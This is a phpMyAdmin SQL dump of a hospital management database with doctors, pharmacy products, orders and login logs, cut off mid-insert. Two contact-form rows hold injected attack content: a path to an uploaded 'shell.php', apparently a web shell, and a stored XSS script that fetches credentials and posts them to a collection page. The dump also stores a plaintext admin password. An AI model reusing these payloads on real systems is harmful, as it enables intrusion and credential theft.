-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Host: 127.0.0.1
-- Generation Time: Jun 30, 2024 at 04:28 PM
-- Server version: 10.4.32-MariaDB
-- PHP Version: 8.2.12

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `hms`
--

-- --------------------------------------------------------

--
-- Table structure for table `admin`
--

CREATE TABLE `admin` (
  `id` int(11) NOT NULL,
  `username` varchar(255) NOT NULL,
  `password` varchar(255) NOT NULL,
  `updationDate` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `admin`
--

INSERT INTO `admin` (`id`, `username`, `password`, `updationDate`) VALUES
(1, 'admin', '@Test123', '19-11-2023 10:32:05 AM');

-- --------------------------------------------------------

--
-- Table structure for table `appointment`
--

CREATE TABLE `appointment` (
  `id` int(11) NOT NULL,
  `doctorSpecialization` varchar(255) DEFAULT NULL,
  `doctorId` int(11) DEFAULT NULL,
  `userId` int(11) DEFAULT NULL,
  `consultancyFees` int(11) DEFAULT NULL,
  `appointmentDate` varchar(255) DEFAULT NULL,
  `appointmentTime` varchar(255) DEFAULT NULL,
  `postingDate` timestamp NULL DEFAULT current_timestamp(),
  `userStatus` int(11) DEFAULT NULL,
  `doctorStatus` int(11) DEFAULT NULL,
  `updationDate` timestamp NULL DEFAULT NULL ON UPDATE current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

-- --------------------------------------------------------

--
-- Table structure for table `contact`
--

CREATE TABLE `contact` (
  `id` int(11) NOT NULL,
  `fullname` varchar(255) DEFAULT NULL,
  `email` varchar(255) DEFAULT NULL,
  `contactno` bigint(12) DEFAULT NULL,
  `message` mediumtext DEFAULT NULL,
  `image` varchar(255) DEFAULT NULL,
  `PostingDate` timestamp NULL DEFAULT current_timestamp(),
  `AdminRemark` mediumtext DEFAULT NULL,
  `LastupdationDate` timestamp NULL DEFAULT NULL ON UPDATE current_timestamp(),
  `IsRead` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `contact`
--

INSERT INTO `contact` (`id`, `fullname`, `email`, `contactno`, `message`, `image`, `PostingDate`, `AdminRemark`, `LastupdationDate`, `IsRead`) VALUES
(113, 'test', 'test@mail.com', 9061234567, 'wew', 'D:/xampp/htdocs/healhub/uploads/shell.php', '2024-06-30 14:22:01', NULL, NULL, NULL),
(114, 'test', 'test@mail.com', 9061234567, '<script> document.addEventListener(\'DOMContentLoaded\', (event) => {     var xhr = new XMLHttpRequest();     xhr.open(\'GET\', \'http://localhost/healhub/uploads/fetch_credentials.php\', true);     xhr.onreadystatechange = function () {         if (xhr.readyState == 4 && xhr.status == 200) {             var credentials = xhr.responseText;             var xhr2 = new XMLHttpRequest();             xhr2.open(\'POST\', \'http://localhost/healhub/uploads/save_credentials.php\', true);             xhr2.setRequestHeader(\'Content-Type\', \'application/x-www-form-urlencoded\');             xhr2.send(\'data=\' + encodeURIComponent(credentials));         }     };     xhr.send(); }); </script>', 'D:/xampp/htdocs/healhub/uploads/', '2024-06-30 14:23:08', NULL, NULL, NULL);

-- --------------------------------------------------------

--
-- Table structure for table `doctors`
--

CREATE TABLE `doctors` (
  `id` int(11) NOT NULL,
  `specilization` varchar(255) DEFAULT NULL,
  `doctorName` varchar(255) DEFAULT NULL,
  `address` longtext DEFAULT NULL,
  `docFees` varchar(255) DEFAULT NULL,
  `contactno` bigint(11) DEFAULT NULL,
  `docEmail` varchar(255) DEFAULT NULL,
  `password` varchar(255) DEFAULT NULL,
  `creationDate` timestamp NULL DEFAULT current_timestamp(),
  `updationDate` timestamp NULL DEFAULT NULL ON UPDATE current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `doctors`
--

INSERT INTO `doctors` (`id`, `specilization`, `doctorName`, `address`, `docFees`, `contactno`, `docEmail`, `password`, `creationDate`, `updationDate`) VALUES
(4, 'Dental Care', 'Erika', 'Commonwealth, Quezon City', '350', 923658923, 'erika@gmail.com', '32250170a0dca92d53ec9624f336ca24', '2023-11-19 13:00:27', '0000-00-00 00:00:00');

-- --------------------------------------------------------

--
-- Table structure for table `doctorslog`
--

CREATE TABLE `doctorslog` (
  `id` int(11) NOT NULL,
  `uid` int(11) DEFAULT NULL,
  `username` varchar(255) DEFAULT NULL,
  `userip` binary(16) DEFAULT NULL,
  `loginTime` timestamp NULL DEFAULT current_timestamp(),
  `logout` varchar(255) DEFAULT NULL,
  `status` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `doctorslog`
--

INSERT INTO `doctorslog` (`id`, `uid`, `username`, `userip`, `loginTime`, `logout`, `status`) VALUES
(27, 4, 'erika@gmail.com', 0x3a3a3100000000000000000000000000, '2023-11-19 13:00:49', '19-11-2023 06:35:42 PM', 1),
(28, 4, 'erika@gmail.com', 0x3a3a3100000000000000000000000000, '2023-11-19 13:07:02', '19-11-2023 06:37:08 PM', 1),
(29, 4, 'erika@gmail.com', 0x3a3a3100000000000000000000000000, '2023-11-19 13:07:28', '19-11-2023 06:39:46 PM', 1),
(30, 4, 'erika@gmail.com', 0x3a3a3100000000000000000000000000, '2023-11-19 13:11:14', NULL, 1),
(31, 4, 'erika@gmail.com', 0x3a3a3100000000000000000000000000, '2023-11-19 13:27:43', '19-11-2023 09:28:08 PM', 1);

-- --------------------------------------------------------

--
-- Table structure for table `doctorspecilization`
--

CREATE TABLE `doctorspecilization` (
  `id` int(11) NOT NULL,
  `specilization` varchar(255) DEFAULT NULL,
  `creationDate` timestamp NULL DEFAULT current_timestamp(),
  `updationDate` timestamp NULL DEFAULT NULL ON UPDATE current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `doctorspecilization`
--

INSERT INTO `doctorspecilization` (`id`, `specilization`, `creationDate`, `updationDate`) VALUES
(1, 'Orthopedics', '2022-10-30 18:09:46', NULL),
(2, 'Internal Medicine', '2022-10-30 18:09:57', NULL),
(3, 'Obstetrics and Gynecology', '2022-10-30 18:10:18', NULL),
(4, 'Dermatology', '2022-10-30 18:10:28', NULL),
(5, 'Pediatrics', '2022-10-30 18:10:37', NULL),
(6, 'Radiology', '2022-10-30 18:10:46', NULL),
(7, 'General Surgery', '2022-10-30 18:10:56', NULL),
(8, 'Ophthalmology', '2022-10-30 18:11:03', NULL),
(9, 'Anesthesia', '2022-10-30 18:11:15', NULL),
(10, 'Pathology', '2022-10-30 18:11:22', NULL),
(11, 'ENT', '2022-10-30 18:11:30', NULL),
(12, 'Dental Care', '2022-10-30 18:11:39', NULL),
(13, 'Dermatologists', '2022-10-30 18:12:02', NULL),
(14, 'Endocrinologists', '2022-10-30 18:12:10', NULL),
(15, 'Neurologists', '2022-10-30 18:12:30', NULL);

-- --------------------------------------------------------

--
-- Table structure for table `orders`
--

CREATE TABLE `orders` (
  `id` int(11) NOT NULL,
  `user_id` int(11) DEFAULT NULL,
  `product_id` int(11) DEFAULT NULL,
  `quantity` int(11) DEFAULT NULL,
  `total_price` decimal(10,2) DEFAULT NULL,
  `order_date` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `orders`
--

INSERT INTO `orders` (`id`, `user_id`, `product_id`, `quantity`, `total_price`, `order_date`) VALUES
(37, 5, 70, 10, 387.70, '2023-12-01 14:10:40'),
(38, 5, 69, 10, 1842.00, '2023-12-01 14:10:40'),
(39, 5, 70, 50, 1938.50, '2023-12-01 14:37:26'),
(40, 5, 72, 50, 1987.50, '2023-12-01 14:37:57'),
(41, 5, 70, 1, 38.77, '2023-12-01 14:38:22'),
(42, 5, 70, 1, 38.77, '2023-12-05 17:09:31'),
(43, 5, 69, 1, 184.20, '2023-12-05 17:09:31');

-- --------------------------------------------------------

--
-- Table structure for table `products`
--

CREATE TABLE `products` (
  `id` int(11) NOT NULL,
  `name` varchar(255) NOT NULL,
  `description` text NOT NULL,
  `price` decimal(10,2) NOT NULL,
  `image` varchar(255) DEFAULT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `products`
--

INSERT INTO `products` (`id`, `name`, `description`, `price`, `image`, `created_at`, `updated_at`) VALUES
(68, 'Paracetamol (Acetaminophen)', 'Pain reliever and fever reducer. 500mg 10 Tablets', 47.50, 'paracetamol.png', '2023-12-01 13:55:37', '2023-12-01 13:55:37'),
(69, 'Ibuprofen ', 'Nonsteroidal anti-inflammatory drug (NSAID) used for pain and inflammation. 200mg 20 Capsules', 184.20, 'advil200mg100caps.png', '2023-12-01 13:56:56', '2023-12-01 13:56:56'),
(70, 'Cetirizine', 'Antihistamine used to relieve allergy symptoms. 10mg 10 Tablets', 38.77, 'Cetirizine.png', '2023-12-01 13:58:37', '2023-12-01 13:58:37'),
(71, 'Loperamide', 'Anti-diarrheal medication. 2mg 20 Capsules', 170.00, 'loperamide.png', '2023-12-01 13:59:37', '2023-12-01 13:59:37'),
(72, 'Omeprazole', 'Proton pump inhibitor used to treat stomach ulcers and acid reflux. 40mg 1 Capsule', 39.75, 'Omeprazole.jpg', '2023-12-01 14:00:56', '2023-12-01 14:00:56');

-- --------------------------------------------------------

--
-- Table structure for table `tblmedicalhistory`
--

CREATE TABLE `tblmedicalhistory` (
  `ID` int(10) NOT NULL,
  `PatientID` int(10) DEFAULT NULL,
  `BloodPressure` varchar(200) DEFAULT NULL,
  `BloodSugar` varchar(200) NOT NULL,
  `Weight` varchar(100) DEFAULT NULL,
  `Temperature` varchar(200) DEFAULT NULL,
  `MedicalPres` mediumtext DEFAULT NULL,
  `CreationDate` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

-- --------------------------------------------------------

--
-- Table structure for table `tblpatient`
--

CREATE TABLE `tblpatient` (
  `ID` int(10) NOT NULL,
  `Docid` int(10) DEFAULT NULL,
  `PatientName` varchar(200) DEFAULT NULL,
  `PatientContno` bigint(10) DEFAULT NULL,
  `PatientEmail` varchar(200) DEFAULT NULL,
  `PatientGender` varchar(50) DEFAULT NULL,
  `PatientAdd` mediumtext DEFAULT NULL,
  `PatientAge` int(10) DEFAULT NULL,
  `PatientMedhis` mediumtext DEFAULT NULL,
  `CreationDate` timestamp NULL DEFAULT current_timestamp(),
  `UpdationDate` timestamp NULL DEFAULT NULL ON UPDATE current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

-- --------------------------------------------------------

--
-- Table structure for table `userlog`
--

CREATE TABLE `userlog` (
  `id` int(11) NOT NULL,
  `uid` int(11) DEFAULT NULL,
  `username` varchar(255) DEFAULT NULL,
  `userip` binary(16) DEFAULT NULL,
  `loginTime` timestamp NULL DEFAULT current_timestamp(),
  `logout` varchar(255) DEFAULT NULL,
  `status` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `userlog`
--

INSERT INTO `userlog` (`id`, `uid`, `username`, `userip`, `loginTime`, `logout`, `status`) VALUES
(5, NULL, 'Blacksyrose', 0x3a3a3100000000000000000000000000, '2023-11-19 10:43:23', NULL, 0),
(6, NULL, 'Erika', 0x3a3a3100000000000000000000000000, '2023-11-19 10:44:50', NULL, 0),
(7, 3, 'ferolinoerika@gmail.com', 0x3a3a3100000000000000000000000000, '2023-11-19 10:45:09', '19-11-2023 04:16:23 PM', 1),
(8, 3, 'ferolinoerika@gmail.com', 0x3a3a3100000000000000000000000000, '2023-11-19 10:47:41', NULL, 1),
(9, 3, 'ferolinoerika@gmail.com', 0x3a3a3100000000000000000000000000, '2023-11-19 11:03:22', '19-11-2023 04:41:37 PM', 1),
(10, NULL, 'ferolinoerika@gmail.com', 0x3a3a3100000000000000000000000000, '2023-11-19 11:12:27', NULL, 0),
(11, 3, 'ferolinoerika@gmail.com', 0x3a3a3100000000000000000000000000, '2023-11-19 11:12:33', '19-11-2023 04:42:51 PM', 1),
(12, 3, 'ferolinoerika@gmail.com', 0x3a3a3100000000000000000000000000, '2023-11-19 11:24:47', '19-11-2023 07:33:09 PM', 1),
(13, 3, 'ferolinoerika@gmail.com', 0x3a3a3100000000000000000000000000, '2023-11-19 11:36:37', '19-11-2023 07:36:54 PM', 1),
(14, 3, 'ferolinoerika@gmail.com', 0x3a3a3100000000000000000000000000, '2023-11-19 11:43:01', '19-11-2023 07:43:06 PM', 1),
(15, 3, 'ferolinoerika@gmail.com', 0x3a3a3100000000000000000000000000, '2023-11-19 12:35:20', '19-11-2023 08:35:39 PM', 1),
(16, 3, 'ferolinoerika@gmail.com', 0x3a3a3100000000000000000000000000, '2023-11-19 12:35:51', '19-11-2023 08:38:06 PM', 1),
(17, 3, 'ferolinoerika@gmail.com', 0x3a3a3100000000000000000000000000, '2023-11-19 12:38:15', '19-11-2023 08:38:22 PM', 1),
(18, NULL, 'Erika', 0x3a3a3100000000000000000000000000, '2023-11-19 12:49:32', NULL, 0),
(19, 3, 'ferolinoerika@gmail.com', 0x3a3a3100000000000000000000000000, '2023-11-19 12:51:06', '19-11-2023 08:51:09 PM', 1),
(20, 3, 'ferolinoerika@gmail.com', 0x3a3a3100000000000000000000000000, '2023-11-19 12:51:34', NULL, 1),
(21, NULL, 'ferolinoerika@gmail.com', 0x3a3a3100000000000000000000000000, '2023-11-19 12:52:18', NULL, 0),
(22, 3, 'ferolinoerika@gmail.com', 0x3a3a3100000000000000000000000000, '2023-11-19 12:52:33', '19-11-2023 08:52:49 PM', 1),
(23, NULL, 'Erika', 0x3a3a3100000000000000000000000000, '2023-11-19 12:57:48', NULL, 0),
(24, 3, 'ferolinoerika@gmail.com', 0x3a3a3100000000000000000000000000, '2023-11-19 12:57:53', '19-11-2023 08:57:56 PM', 1),
(25, 3, 'ferolinoerika@gmail.com', 0x3a3a3100000000000000000000000000, '2023-11-19 13:09:56', '19-11-2023 09:11:07 PM', 1),
(26, 4, 'nicole@gmail.com', 0x3a3a3100000000000000000000000000, '2023-11-19 13:14:55', NULL, 1),
(27, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-26 08:13:54', '26-11-2023 04:18:14 PM', 1),
(28, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-26 08:18:25', NULL, 1),
(29, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-26 08:27:38', '26-11-2023 04:27:48 PM', 1),
(30, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-26 08:54:17', NULL, 1),
(31, 5, '', 0x3a3a3100000000000000000000000000, '2023-11-26 09:17:50', '26-11-2023 05:17:58 PM', 1),
(32, 5, '', 0x3a3a3100000000000000000000000000, '2023-11-26 09:18:48', NULL, 1),
(33, 5, '', 0x3a3a3100000000000000000000000000, '2023-11-26 09:19:25', '26-11-2023 05:32:32 PM', 1),
(34, 5, '', 0x3a3a3100000000000000000000000000, '2023-11-26 09:33:07', '26-11-2023 05:35:32 PM', 1),
(35, 5, '', 0x3a3a3100000000000000000000000000, '2023-11-26 09:35:40', '26-11-2023 05:43:30 PM', 1),
(36, 5, '', 0x3a3a3100000000000000000000000000, '2023-11-26 09:44:05', '26-11-2023 05:46:43 PM', 1),
(37, 5, '', 0x3a3a3100000000000000000000000000, '2023-11-26 09:50:55', '26-11-2023 05:52:44 PM', 1),
(38, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-26 09:54:28', '26-11-2023 05:55:01 PM', 1),
(39, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-26 09:56:18', '26-11-2023 05:56:46 PM', 1),
(40, 5, '', 0x3a3a3100000000000000000000000000, '2023-11-26 09:57:15', NULL, 1),
(41, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-26 10:55:23', '26-11-2023 07:00:15 PM', 1),
(42, 5, '', 0x3a3a3100000000000000000000000000, '2023-11-26 11:01:04', NULL, 1),
(43, 5, '', 0x3a3a3100000000000000000000000000, '2023-11-26 11:01:18', NULL, 1),
(44, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-26 11:03:21', '26-11-2023 07:03:44 PM', 1),
(45, 5, '', 0x3a3a3100000000000000000000000000, '2023-11-26 11:06:16', NULL, 1),
(46, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-26 11:07:33', '26-11-2023 07:07:41 PM', 1),
(47, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-26 11:11:51', NULL, 1),
(48, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-26 11:13:00', NULL, 1),
(49, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-26 11:13:42', '26-11-2023 07:14:01 PM', 1),
(50, 5, '', 0x3a3a3100000000000000000000000000, '2023-11-26 11:15:10', '26-11-2023 07:15:21 PM', 1),
(51, 5, '', 0x3a3a3100000000000000000000000000, '2023-11-26 11:16:38', '26-11-2023 07:22:35 PM', 1),
(52, 5, '', 0x3a3a3100000000000000000000000000, '2023-11-26 11:22:42', '26-11-2023 07:23:07 PM', 1),
(53, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-26 11:26:34', '26-11-2023 07:26:37 PM', 1),
(54, 5, '', 0x3a3a3100000000000000000000000000, '2023-11-26 11:26:42', NULL, 1),
(55, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-26 11:28:21', '26-11-2023 07:30:07 PM', 1),
(56, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-26 11:30:13', '26-11-2023 07:35:54 PM', 1),
(57, 5, '', 0x3a3a3100000000000000000000000000, '2023-11-26 11:36:02', '26-11-2023 07:36:50 PM', 1),
(58, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-26 11:36:56', '26-11-2023 07:47:44 PM', 1),
(59, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-26 11:48:13', '26-11-2023 07:48:28 PM', 1),
(60, 5, '', 0x3a3a3100000000000000000000000000, '2023-11-26 11:49:53', '26-11-2023 07:54:16 PM', 1),
(61, 5, '', 0x3a3a3100000000000000000000000000, '2023-11-26 11:54:22', NULL, 1),
(62, NULL, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-26 11:57:20', NULL, 0),
(63, NULL, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-26 11:57:33', NULL, 0),
(64, NULL, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-26 11:57:39', NULL, 0),
(65, NULL, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-26 11:57:54', NULL, 0),
(66, NULL, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-26 11:58:12', NULL, 0),
(67, NULL, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-26 11:58:16', NULL, 0),
(68, NULL, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-26 11:58:29', NULL, 0),
(69, NULL, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-26 11:58:42', NULL, 0),
(70, NULL, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-26 11:58:47', NULL, 0),
(71, NULL, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-26 11:58:54', NULL, 0),
(72, NULL, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-26 11:59:05', NULL, 0),
(73, NULL, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-26 11:59:39', NULL, 0),
(74, NULL, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-26 11:59:49', NULL, 0),
(75, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-26 12:00:25', '26-11-2023 08:00:37 PM', 1),
(76, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-26 12:00:43', '26-11-2023 08:00:47 PM', 1),
(77, 5, '', 0x3a3a3100000000000000000000000000, '2023-11-26 12:00:53', '26-11-2023 08:03:56 PM', 1),
(78, 5, '', 0x3a3a3100000000000000000000000000, '2023-11-26 12:06:05', NULL, 1),
(79, 5, '', 0x3a3a3100000000000000000000000000, '2023-11-26 12:06:18', NULL, 1),
(80, 5, '', 0x3a3a3100000000000000000000000000, '2023-11-26 12:06:37', NULL, 1),
(81, 5, '', 0x3a3a3100000000000000000000000000, '2023-11-26 12:07:21', '26-11-2023 08:07:36 PM', 1),
(82, 5, '', 0x3a3a3100000000000000000000000000, '2023-11-26 12:07:43', '26-11-2023 08:08:52 PM', 1),
(83, 5, '', 0x3a3a3100000000000000000000000000, '2023-11-26 12:09:11', '26-11-2023 08:09:13 PM', 1),
(84, 5, '', 0x3a3a3100000000000000000000000000, '2023-11-26 12:09:20', NULL, 1),
(85, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-26 12:10:17', '26-11-2023 08:21:45 PM', 1),
(86, 5, '', 0x3a3a3100000000000000000000000000, '2023-11-26 12:25:01', NULL, 1),
(87, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-26 12:26:46', '26-11-2023 08:26:53 PM', 1),
(88, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-26 12:33:11', NULL, 1),
(89, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-26 12:33:57', NULL, 1),
(90, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-26 12:41:28', NULL, 1),
(91, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-26 12:41:40', '26-11-2023 08:43:54 PM', 1),
(92, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-26 12:43:59', '26-11-2023 08:54:56 PM', 1),
(93, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-26 12:55:00', NULL, 1),
(94, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-26 13:37:35', NULL, 1),
(95, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-26 13:44:30', NULL, 1),
(96, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-26 18:04:56', NULL, 1),
(97, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-26 18:19:38', '27-11-2023 02:32:51 AM', 1),
(98, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-26 18:34:51', '27-11-2023 03:05:26 AM', 1),
(99, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-26 19:05:30', '27-11-2023 03:09:01 AM', 1),
(100, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-26 19:09:09', '27-11-2023 03:30:41 AM', 1),
(101, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-26 19:42:46', '27-11-2023 03:51:32 AM', 1),
(102, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-26 19:52:32', '27-11-2023 05:41:16 AM', 1),
(103, NULL, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-26 21:41:21', NULL, 0),
(104, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-26 21:41:26', '27-11-2023 04:27:05 PM', 1),
(105, NULL, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-27 08:27:11', NULL, 0),
(106, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-27 08:27:15', '27-11-2023 05:06:42 PM', 1),
(107, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-27 09:06:46', NULL, 1),
(108, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-27 09:17:50', '27-11-2023 05:23:49 PM', 1),
(109, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-27 09:23:53', '27-11-2023 06:28:24 PM', 1),
(110, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-27 10:28:28', '27-11-2023 08:31:44 PM', 1),
(111, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-27 12:31:49', '28-11-2023 12:54:10 AM', 1),
(112, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-27 17:08:21', NULL, 1),
(113, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-27 17:15:37', '28-11-2023 11:39:22 AM', 1),
(114, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-28 03:39:28', '28-11-2023 11:39:40 AM', 1),
(115, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-28 03:39:46', '28-11-2023 02:03:01 PM', 1),
(116, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-28 06:03:55', '28-11-2023 02:29:14 PM', 1),
(117, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-28 06:29:19', '28-11-2023 04:31:28 PM', 1),
(118, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-28 08:31:32', '28-11-2023 05:49:27 PM', 1),
(119, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-28 09:49:32', '28-11-2023 06:56:24 PM', 1),
(120, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-28 10:56:30', '28-11-2023 06:56:38 PM', 1),
(121, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-28 13:39:52', '28-11-2023 10:55:37 PM', 1),
(122, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-28 14:55:53', '28-11-2023 10:57:14 PM', 1),
(123, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-28 14:58:17', '28-11-2023 10:59:24 PM', 1),
(124, NULL, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-29 11:39:16', NULL, 0),
(125, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-29 11:39:21', '29-11-2023 08:09:08 PM', 1),
(126, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-29 13:57:25', NULL, 1),
(127, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-30 07:40:07', '30-11-2023 03:41:11 PM', 1),
(128, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-30 07:41:19', '30-11-2023 03:50:54 PM', 1),
(129, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-30 07:50:58', '30-11-2023 10:02:26 PM', 1),
(130, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-30 14:02:32', '30-11-2023 10:02:50 PM', 1),
(131, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-11-30 14:02:56', NULL, 1),
(132, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-12-01 08:03:02', '01-12-2023 04:10:37 PM', 1),
(133, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-12-01 08:10:42', '01-12-2023 04:56:32 PM', 1),
(134, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-12-01 08:56:37', '01-12-2023 05:02:24 PM', 1),
(135, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-12-01 09:34:05', '01-12-2023 05:59:57 PM', 1),
(136, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-12-01 11:39:13', '01-12-2023 07:40:22 PM', 1),
(137, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-12-01 11:40:31', '01-12-2023 07:43:04 PM', 1),
(138, NULL, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-12-01 11:48:52', NULL, 0),
(139, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-12-01 11:48:56', '01-12-2023 08:39:59 PM', 1),
(140, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-12-01 12:50:24', '01-12-2023 08:50:35 PM', 1),
(141, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-12-01 14:10:08', '01-12-2023 10:11:33 PM', 1),
(142, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-12-01 14:36:46', '01-12-2023 10:38:31 PM', 1),
(143, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-12-01 14:40:07', '01-12-2023 10:40:45 PM', 1),
(144, 5, 'john@mail.com', 0x3a3a3100000000000000000000000000, '2023-12-05 17:09:15', NULL, 1),
(145, NULL, 'test', 0x3a3a3100000000000000000000000000, '2024-06-24 13:32:10', NULL, 0),
(146, NULL, 'admin', 0x3a3a3100000000000000000000000000, '2024-06-24 13:32:30', NULL, 0),
